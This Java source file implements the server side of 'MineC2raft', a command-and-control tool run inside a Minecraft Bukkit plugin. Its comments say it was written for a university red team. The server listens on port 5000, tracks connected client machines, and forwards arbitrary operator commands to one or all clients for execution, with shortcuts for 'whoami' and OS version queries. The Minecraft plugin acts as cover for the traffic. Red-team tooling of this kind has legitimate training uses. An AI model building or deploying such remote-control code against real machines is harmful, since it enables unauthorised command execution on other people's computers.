package com.minec2raft.Server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.CopyOnWriteArrayList;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;


/**@author Austin Hall
 * Main server class that handles communication between multiple clients running the Client class.
 * Utilizes the ClientHandler class, making this class easier to read.
 * Original Server code modified for compatibility with Bukkit API.
 * CHATGPT was used as a LEARNING TOOL in the creation of this software.
 */
public class Server {

    //Escape codes or sommn for different colors (now changed for minecraft color coding). 
    public static final String RED = "§4";
    public static final String GREEN = "§2";
    public static final String YELLOW = "§e";
    public static final String RESET = "§f";

    private static boolean exists = false;
    private static final double VERSION_NUM = 0.1; //version number (change when I feel cheeky ;)
    public static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>(); // array of clients as threads.

    private static ServerSocket serverSocket; //socket of the server duh
    private static BukkitTask connectionThread; // bukkit thread that synchronises actions between this server and minecraft.

    /**
     * Creates a new Server object. Make only one of these plz
     */
    public Server(){
        try {
            serverSocket = new ServerSocket(5000);
            System.out.println("Server Ready.");
            exists = true;
        } catch(IOException e) {
            
            System.out.println("Creation of server Failed. " + e);
        }
    } 
    
    /**
     * runs all of the code relating to client / server communication, and handles user input for commands.
     * @throws IOException
     */
    public void runServer(JavaPlugin plugin) throws IOException {
        System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);

        //schedule bukkit thread to handle communications between server any any clients
         connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                while(!Thread.currentThread().isInterrupted()) {
                    Socket clientSocket = serverSocket.accept();
                    System.out.println(GREEN + "Client found at: " + YELLOW + clientSocket.getPort() + RESET);

                    ClientHandler handler = new ClientHandler(clientSocket);
                    clients.add(handler);
                    handler.start(); 
                    
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, handler);
                }
            } catch (IOException e) {
                System.out.println(RED + "Client thread stopped." + RESET);
            } 
        });
        
        System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);
    }    

    /**
     * Method that helps runServer() interpret user commands. 
     * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
     * @param cmd - the user input.
     */
    public static String commandHandler(String cmd, String target, CommandSender sender) {
        String reply;
        String returnStr = "";
        switch(cmd) {
            case "os", "version":
                reply = "ver";
                returnStr = broadcast(reply, null, target);
                break;
            case "user", "client":
                reply = "whoami";
                returnStr = broadcast(reply, null, target);
                break;
            case "coms", "commands", "cmds", "HELP": 
                reply = "               ********** MineC2raft Commands ***********\n" 
                            + "os: displays the os of the client.\n"
                            + "user: displays the name of the client.\n" 
                            + "quit: exits the client port.\n" 
                            + "clients: displays all connected clients.\n"
                            + "about: about the program.\n"  
                            + "       ******************************************\n\n" 
                            + "WINDOWS ONLY\n(i'll add linux soon) but like lowk you can use a remote terminal \n" 
                            + "Thats all you need to know foo\n";
                BroadcastPrintStream.println(reply, false);
                break;
            case "poop":
                for(int i = 1; i <= 100; i++) {
                    System.out.println(i + ": Poop");
                }
                break;
            case "about", "abt":
                reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
                        + "Version: " + VERSION_NUM 
                        + "\nWritten by Austin Hall for RIT's Red Team.\n" 
                        + "For fun too lowk...\n\n" 
                        + "A dud?\n/give @p oak_sapling 100";
                  BroadcastPrintStream.println(reply, sender, false);
                break;
            case "sockets", "clients", "list", "lst", "array", "arr": //this does not need to be here anymore but will stay for legacy
                formatArrLst();
                break;                
            default: 
                returnStr = broadcast(cmd, null, target);
                break;  
        }
        return returnStr;
    }

    /** 
     * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
     * @return the String to return to the minecraft command (so you can see it show up in chat!)
     */
    public static String broadcast(String msg, ClientHandler sender, String response) {

        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
            
        }
        if(clients.isEmpty()) {
            System.out.println(RED + "No clients connected." + RESET);
            
        }

        if(response != null) {
            if(response.equals("all")) {
                for(ClientHandler client : clients) {
                    if (client != sender) {
                        client.sendMessage("CMD: " + msg);
                        return client.getRecentLn();
                    }
                }
            } else {
                try {
                    clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
                    return clients.get(Integer.parseInt(response)).getRecentLn();
                } catch(Exception e) {
                    System.out.println("Invalid Target!");
                }
            }
        }
        return null;
    }

    /**
     * Helper method that nicely prints out all connected clients (as per the array).
     */
    public static String formatArrLst() {
        String arr = "";
        if(clients.size() > 0) {
            arr += GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
        } else {
            arr += RED + "No connected clients. " + RESET + "\n";
        }
        for(int i = 0; i < clients.size(); i++) {
             arr += YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort() + "\n";
        }
        arr += "all: broadcast to all clients";
        return arr;
    }

    /**
     * lets hope this correctly checks to see if we've ever made a server, so that people can't make more than one.
     * @return whether or not a server is enabled
     */
    public static boolean isEnabled() {
        return exists;
    }

    public static void stopServer() {
        try {
            serverSocket.close();
            connectionThread.cancel();
            exists = false;

        } catch(Exception e) {
            System.out.println("Error stopping server: " + e);
        }
        
    }
}
